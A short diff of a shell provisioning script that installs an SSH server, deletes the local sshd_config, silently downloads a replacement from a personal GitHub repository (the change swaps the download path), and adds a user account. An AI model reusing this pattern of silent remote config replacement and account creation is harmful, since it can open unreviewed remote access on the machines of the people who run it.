@@ -13,7 +13,7 @@ apt update && apt install  wget net-tools -y &> /dev/null
 
 apt install openssh-server sshpass screen -y &> /dev/null 
 rm -rf /etc/ssh/sshd_config &> /dev/null 
-cd /etc/ssh && wget https://github.com/githubaunglaymyanmar/fordownload/raw/main/ssh/sshd_config &> /dev/null 
+cd /etc/ssh && wget https://github.com/githubaunglaymyanmar/fordownload/raw/refs/heads/main/ssh/ssh4444/sshd_config &> /dev/null 
 service ssh restart &> /dev/null 
 apt install sshpass screen -y &> /dev/null 
 useradd -m aunglay &> /dev/null 
